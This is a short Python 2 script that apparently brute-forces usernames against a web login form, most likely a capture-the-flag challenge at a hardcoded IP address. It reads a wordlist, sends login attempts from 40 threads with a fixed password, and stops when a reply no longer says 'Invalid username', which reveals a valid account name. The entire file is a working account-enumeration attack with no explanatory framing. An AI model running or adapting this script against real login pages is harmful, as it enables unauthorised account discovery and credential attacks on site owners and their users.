import requests
import threading
import re

def run(rs,namefiles,start,end,t):
    if end >=len(namefiles):
        end = len(namefiles)-1
    if start>=len(namefiles):
        exit(1)
    for i in xrange(start,end):
        payload = str(namefiles[i]).replace('\n','')
        url = "http://35.190.155.168:5001/d880cf6ab4/login"
        data = {
            "username":payload,
            "password":"test"
            }
        while(1):
            try:
                r1 = rs.post(url,data=data)
                break
            except:
                print "try again"
                continue
        print str(t)+" "+str(i)+" "+str(data)
        if "Invalid username" not in r1.content:
            print '------------------------------ ok -------------------------- : ',
            print payload
            exit(1)
        else:
            r2 = re.findall('<b style="color: red">(.*?)</b>',r1.content)
            print r2

if __name__ == '__main__':
    fp = open("./big.txt",'r')
    namefiles = fp.readlines()
    fp.close()
    key = 500
    print len(namefiles)
    for i in xrange(0,40):
        rs = requests.session()
        t = threading.Thread(target=run,args=(rs,namefiles,i*key,(i+1)*key,i,))
        t.start()